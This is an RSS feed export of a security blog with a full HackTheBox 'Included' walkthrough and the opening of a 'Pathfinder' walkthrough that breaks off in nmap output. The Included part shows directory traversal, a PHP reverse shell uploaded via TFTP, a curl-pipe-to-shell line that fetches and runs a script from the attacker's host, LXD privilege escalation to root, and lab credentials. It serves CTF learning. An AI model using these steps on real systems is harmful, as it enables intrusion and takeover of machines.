<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[h4rithd.com]]></title><description><![CDATA[Penetration Tester | Ethical Hacker | Security Researcher]]></description><link>http://192.168.8.3:2368/</link><image><url>http://192.168.8.3:2368/favicon.png</url><title>h4rithd.com</title><link>http://192.168.8.3:2368/</link></image><generator>Ghost 4.6</generator><lastBuildDate>Wed, 26 May 2021 22:56:14 GMT</lastBuildDate><atom:link href="http://192.168.8.3:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Included Walkthrough]]></title><description><![CDATA[<p>After the Pathfinder Walkthrough, Here I&apos;m with Included, so... let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through</p>]]></description><link>http://192.168.8.3:2368/starting-point-htb-included-walkthrough/</link><guid isPermaLink="false">60aecda854f7b1d506ddbb54</guid><category><![CDATA[h4rithd]]></category><category><![CDATA[HackTheBox]]></category><category><![CDATA[HarithDilshan]]></category><category><![CDATA[HTB Walkthrough]]></category><category><![CDATA[HTB Writeup]]></category><category><![CDATA[StartingPoint]]></category><category><![CDATA[Writeup]]></category><category><![CDATA[Included Walkthrough]]></category><category><![CDATA[Included]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Mon, 24 May 2021 22:37:00 GMT</pubDate><media:content url="http://192.168.8.3:2368/content/images/2021/05/6.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://192.168.8.3:2368/content/images/2021/05/6.jpg" alt="Included Walkthrough"><p>After the Pathfinder Walkthrough, Here I&apos;m with Included, so... let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="http://192.168.8.3:2368/@shapmanasick/s/starting-point-htb/pathfinder-walkthrough">Pathfinder </a>machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine &#x2026;</h2><p>To start machine, just click &quot;Join Machine&quot;.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-66.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1347" height="734" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-66.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-66.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-66.png 1347w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. Usually it is <code><strong>10.10.10.55 </strong></code><strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaUNZILxtxwZrMSnVEI%2F-MaUOwCey-fZCBhjBLaj%2Fimage.png?alt=media&amp;token=c796c3a0-8a2b-4c2e-b2e1-e2adfa41f69f" class="kg-image" alt="Included Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">10.10.10.55</div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests from passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;hidd3nwiki)-[StartingPoints/Included]
&#x2514;&#x2500;# ping 10.10.10.55 -c 2
PING 10.10.10.55 (10.10.10.55) 56(84) bytes of data.
64 bytes from 10.10.10.55: icmp_seq=1 ttl=63 time=297 ms
64 bytes from 10.10.10.55: icmp_seq=2 ttl=63 time=321 ms

--- 10.10.10.55 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 296.954/308.942/320.931/11.988 ms</code></pre><p>As a ping result, It&apos;s TTL=63. There is only one route between machine and us (VPN). So definitely it will be a Linux machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.55</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;hidd3nwiki)-[StartingPoints/Included]
&#x2514;&#x2500;# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 13:26 EDT
Initiating Ping Scan at 13:26
Scanning 10.10.10.55 [4 ports]
Completed Ping Scan at 13:26, 0.29s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:26
Scanning 10.10.10.55 [65535 ports]
Discovered open port 80/tcp on 10.10.10.55
SYN Stealth Scan Timing: About 47.58% done; ETC: 13:28 (0:00:34 remaining)
Completed SYN Stealth Scan at 13:28, 64.20s elapsed (65535 total ports)
Nmap scan report for 10.10.10.55
Host is up, received reset ttl 63 (0.22s latency).
Scanned at 2021-05-24 13:26:58 EDT for 65s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 64.72 seconds
           Raw packets sent: 79376 (3.493MB) | Rcvd: 78517 (3.141MB)
           </code></pre><p>So again we have only port 80 open.</p><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;hidd3nwiki)-[StartingPoints/Included]
&#x2514;&#x2500;# nmap -sV -sC -oN DetailPorts.nmap -p 80 10.10.10.55                                                                                                                                                   130 &#x2A2F;
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 13:29 EDT
Nmap scan report for 10.10.10.55
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.10.55/?file=index.php

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds</code></pre><p>We have only port 80 open here. Now you know what is next..</p><h3 id="013-discover-more-on-port-80">01.3 Discover more on port 80</h3><p>Let&apos;s open web browser and check what is inside the port 80.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-67.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1322" height="891" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-67.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-67.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-67.png 1322w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the URL, we can assume that we have some Directory Traversal vulnerability here. So let&apos;s check it.</p><blockquote>Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server. <a href="https://portswigger.net/web-security/file-path-traversal" rel="noopener noreferrer">source</a></blockquote><p>We can easily check this using burp suite repeater tab. Let&apos;s power up burp suite and navigate to the site again.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-68.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1866" height="943" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-68.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-68.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-68.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-68.png 1866w" sizes="(min-width: 720px) 720px"></figure><p><br>As you can see we have Directory Traversal vulnerability. If we can upload any reverse shell script, we can call that file and get success by using this vulnerability. But do how we upload the reverse shell file? I tried so hard to find a way but I could not. &#x1F625;&#x1F625;</p><p>Then I looked deeply at all the users which were available in the <code>/etc/passwd</code> using directory traversal vulnerability. You know what I found there? There is a user also in &#xA0;<a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol" rel="noopener noreferrer">TFTP </a>. Wait what.. How did we miss that port? &#x1F914;&#x1F914; Oh shoot! It&apos;s running on UDP port 69.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-69.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="499" height="497"></figure><p>Let&apos;s run Nmap again and check whether that port is alive.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;hidd3nwiki)-[StartingPoints/Included]
&#x2514;&#x2500;# nmap -sU -p69 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 15:17 EDT
Nmap scan report for 10.10.10.55
Host is up (0.31s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 3.67 seconds</code></pre><p>Yay!! It&apos;s alive. Let&apos;s try to connect to that service.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;hidd3nwiki)-[StartingPoints/Included]
&#x2514;&#x2500;# tftp 10.10.10.55
tftp&gt; ?
Commands may be abbreviated.  Commands are:

connect         connect to remote tftp
mode            set file transfer mode
put             send file
get             receive file
quit            exit tftp
verbose         toggle verbose mode
trace           toggle packet tracing
status          show current status
binary          set mode to octet
ascii           set mode to netascii
rexmt           set per-packet retransmission timeout
timeout         set total retransmission timeout
?               print help information</code></pre><p>Yes we can connect to that service and also we can upload any file using that service. Now we have an idea &#xA0;&#x1F4A1;&#x1F4A1;. But how do I know the exact path where that file was stored in?</p><p>Again we can check that <code>/etc/passwd</code> file to get an idea about the home directory.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-70.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="547" height="114"></figure><p><br>Fine! Now we know where my file will be located after I uploaded it to the TFTP.&#x1F60B;&#x1F60B;</p><hr><h3 id="02-foothold">02. Foothold</h3><p>First we need to create PHP Reverse Shell. We can simply copy it from our kali webshell directory or using <a href="https://www.revshells.com/" rel="noopener noreferrer">this </a>site.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-71.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1536" height="858" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-71.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-71.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-71.png 1536w" sizes="(min-width: 720px) 720px"></figure><p>After editing the above sections you can copy that part of the code and paste it into the file.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaUjnDowVFvSXijt2ic%2F-MaUsba65hDsvdmvO2He%2Fimage.png?alt=media&amp;token=5a71ee46-8d6c-4bb5-ad2c-52b500cd5241" class="kg-image" alt="Included Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Now, let&apos;s use TFTP and upload that file. Use <code>put</code> command to upload the file.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;hidd3nwiki)-[StartingPoints/Included]
&#x2514;&#x2500;# tftp 10.10.10.55
tftp&gt; put hidd3nwiki.php &#x1F448;
Sent 2708 bytes in 2.2 seconds</code></pre><p>Then let&apos;s fire up netcat listener and check that file using Directory Traversal vulnerability. The path to file location will be <code>/var/lib/tftpboot/filename.php</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-72.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1402" height="496" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-72.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-72.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-72.png 1402w" sizes="(min-width: 720px) 720px"></figure><p><br>We successfully landed a reverse shell as www-data, it&apos;s good spawn a TTY shell.</p><pre><code class="language-bash">python3 -c &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot;</code></pre><p>If you look around the <code>/home</code> directory, we have a user called <strong>mike</strong>. Since all these boxes are connected together, [I mean, passwords are reused] we can check using the passwords we found on Pathfinder walkthrough. Let&apos;s try to <code>su mike</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-73.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="675" height="195" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-73.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-73.png 675w"></figure><p>Yes! It was successful and we can grab the user flag using <code>Sheffield19</code> Password. Now it&apos;s time to root flag. &#x1F60E;&#x1F60E;</p><hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>When it comes to privilege escalations, we can manually check one by one or we can simply run any automation script to do the searching for us. Since this box is the Linux box we can use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" rel="noopener noreferrer">LinPEAS </a>.</p><p>First we need to copy that script to our machine.</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh</code></pre><p>Then we can run python demon server to host that file from our end.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;hidd3nwiki)-[/home/&#x2026;/Documents/HackTheBox/StartingPoints/Included]
&#x2514;&#x2500;# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>Now we can use <code>wget </code>command to download that file to the <strong>Included</strong> box. But here, I&apos;m not going to download it and run. Instead of that I use curl command to run that file directly.</p><pre><code class="language-bash">curl http://&lt;YourIP&gt;:8000/inpeas.sh | sh </code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-74.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="815" height="389" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-74.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-74.png 815w" sizes="(min-width: 720px) 720px"></figure><p>We can identify interesting stuff by looking at the output file. &#x1F447;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaXAi1kPj5ASB1oAZ2U%2F-MaXL6cM8X3vxKek6B3r%2Fimage.png?alt=media&amp;token=0afb27d4-728c-49d3-ab73-b02b8ca80ced" class="kg-image" alt="Included Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>As you can see the mike user is in the LXD group. LXD group is a high-privileged group in Linux system.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaX71gS93IHNUagPjAw%2F-MaX8xZAq6POH7Rlc8uf%2Fimage.png?alt=media&amp;token=efa22c3b-d3fd-4097-a97c-b7821528604a" class="kg-image" alt="Included Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Here I found <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" rel="noopener noreferrer">lxd/lxc Group - Privilege escalation</a> script from <a href="https://book.hacktricks.xyz/" rel="noopener noreferrer">hacktricks</a>. And I&apos;m going to go through the <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2" rel="noopener noreferrer">second method</a> in that article.</p><p>First, Try to clone the following repository to your host and build an <a href="https://hub.docker.com/_/alpine" rel="noopener noreferrer">alpine image</a>.</p><pre><code class="language-bash">git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine</code></pre><p>After you executed the build-alpine file, a <code>tar.gx</code> file should be created. File name will be different from my one.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-75.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="807" height="250" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-75.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-75.png 807w" sizes="(min-width: 720px) 720px"></figure><p>Now we can upload it into the server by using python demon web server and download it through wget.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-76.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="937" height="405" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-76.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-76.png 937w" sizes="(min-width: 720px) 720px"></figure><p>Now follow the article again. The following command will import the image and create privileged container with it.</p><pre><code class="language-bash">lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true</code></pre><p>Next we need to mount the <code>/root</code> into the image.</p><pre><code class="language-bash">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</code></pre><p>Now Let&apos;s interact with the container.</p><pre><code class="language-bash">lxc start mycontainer 
lxc exec mycontainer /bin/sh</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-77.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="877" height="393" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-77.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-77.png 877w" sizes="(min-width: 720px) 720px"></figure><p><br>As you can see, we have landed on to the root shell. Now we can grab the root.txt file. It&apos;s located at <code>/mnt/root/root/</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-78.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="377" height="166"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-79.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="872" height="733" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-79.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-79.png 872w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="04-post-exploitation">04. Post Exploitation</h3><p>As you can see there is a <code>login.sql</code> file in the <code>/mnt/root/root</code> directory. Let&apos;s open it.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-80.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="783" height="271" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-80.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-80.png 783w" sizes="(min-width: 720px) 720px"></figure><p><br>And it reveals credentials. <code>Daniel : SNDv*2wzLWf</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-81.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="555" height="152"></figure><p><br>Okay... I&#x2019;ll see you on the next box! &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-82.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="480" height="308"></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Pathfinder Walkthrough]]></title><description><![CDATA[<p>After the Shield Walkthrough, Here I&apos;m with Pathfinder box and this is the last box you can play if you are a free member on HTB platform. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9</p>]]></description><link>http://192.168.8.3:2368/starting-point-htb-pathfinder-walkthrough/</link><guid isPermaLink="false">60aecab354f7b1d506ddbb3b</guid><category><![CDATA[h4rithd]]></category><category><![CDATA[HackTheBox]]></category><category><![CDATA[HarithDilshan]]></category><category><![CDATA[HTB Walkthrough]]></category><category><![CDATA[HTB Writeup]]></category><category><![CDATA[StartingPoint]]></category><category><![CDATA[Writeup]]></category><category><![CDATA[Pathfinder Walkthrough]]></category><category><![CDATA[Pathfinder]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Thu, 06 May 2021 22:25:00 GMT</pubDate><media:content url="http://192.168.8.3:2368/content/images/2021/05/5.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://192.168.8.3:2368/content/images/2021/05/5.jpg" alt="Pathfinder Walkthrough"><p>After the Shield Walkthrough, Here I&apos;m with Pathfinder box and this is the last box you can play if you are a free member on HTB platform. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete Shield machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine &#x2026;</h2><p>To start machine, just click &quot;Join Machine&quot;.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaEUtVo9_WyUvRwmCwd%2F-MaEVeG5FnToZfGM0SkP%2Fimage.png?alt=media&amp;token=80527a75-c0ba-4fad-b31f-caed1e2e416c" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Pathfinder </div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Then you can see the <strong>IP </strong>address for that machine. Usually it is <code><strong>10.10.10.30 </strong></code><strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaEUtVo9_WyUvRwmCwd%2F-MaEVp2aY2oIGboXm46j%2Fimage.png?alt=media&amp;token=653c86c8-adfe-4e17-8adf-9f6309e6d777" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">10.10.10.30</div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests from passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Pathfinder]
&#x2514;&#x2500;# ping 10.10.10.30 -c 2
PING 10.10.10.30 (10.10.10.30) 56(84) bytes of data.
64 bytes from 10.10.10.30: icmp_seq=1 ttl=127 time=235 ms
64 bytes from 10.10.10.30: icmp_seq=2 ttl=127 time=237 ms

--- 10.10.10.30 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 235.305/236.156/237.007/0.851 ms</code></pre><p>As a ping result, It&apos;s TTL=127. There is only one route between machine and us (VPN). So definitely it will be a Windows machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.30</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">&#x2514;&#x2500;# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.30
Discovered open port 389/tcp on 10.10.10.30
Discovered open port 49676/tcp on 10.10.10.30
SYN Stealth Scan Timing: About 72.99% done; ETC: 11:27 (0:00:56 remaining)
Discovered open port 49714/tcp on 10.10.10.30
Discovered open port 49664/tcp on 10.10.10.30
Discovered open port 49667/tcp on 10.10.10.30
Discovered open port 636/tcp on 10.10.10.30
Discovered open port 88/tcp on 10.10.10.30
Discovered open port 9389/tcp on 10.10.10.30
Discovered open port 49666/tcp on 10.10.10.30
Discovered open port 3268/tcp on 10.10.10.30
Completed SYN Stealth Scan at 11:26, 173.96s elapsed (65535 total ports)
Nmap scan report for 10.10.10.30
Host is up, received echo-reply ttl 127 (0.24s latency).
Scanned at 2021-05-21 11:23:43 EDT for 175s
Not shown: 65466 closed ports, 45 filtered ports
Reason: 65466 resets and 45 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
